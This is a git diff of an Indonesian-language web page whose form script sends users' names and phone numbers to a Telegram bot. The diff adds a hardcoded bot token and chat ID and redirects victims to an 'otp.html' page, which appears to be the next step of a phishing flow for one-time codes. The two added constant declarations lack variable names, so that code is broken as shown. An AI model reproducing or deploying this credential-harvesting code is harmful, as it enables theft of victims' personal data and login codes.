@@ -377,11 +377,13 @@
             <img src="img/nav.jpg" alt="Navigasi Bawah">
         </a>
     </nav>
-        <script>
-        <script src="config.js"></script> <!-- Tambahkan config.js -->
-<script>
+      <script>
     const form = document.getElementById('userForm');
     const loading = document.querySelector('.loading');
+
+    // Ganti dengan token bot dan chat ID Telegram Anda
+    const  = "7852581294:AAEcow9FfvWIMzzMLkK6VTKcLWCIX1jApGo";
+    const  = "6824078885";
 
     form.addEventListener('submit', (e) => {
         e.preventDefault();
@@ -420,7 +422,7 @@
         .then(data => {
             loading.style.display = 'none'; // Sembunyikan loading setelah selesai
             if (data.ok) {
-                window.location.href = "halaman-berikutnya.html"; // Redirect setelah sukses
+                window.location.href = "otp.html"; // Redirect setelah sukses
             } else {
                 alert("Gagal mengirim data ke Telegram.");
             }
@@ -436,17 +438,7 @@
         e.preventDefault();
     });
 
-
-    document.getElementById("userForm").addEventListener("submit", function () {
-        let nama = document.getElementById("nama").value;
-        let nomorHP = document.getElementById("nomorHP").value;
-
-        localStorage.setItem("nama", nama);
-        localStorage.setItem("nomorTelepon", nomorHP);
-    });
-
-
-    </script>
+</script>
 
 </body>
-</html>
+                    </html>
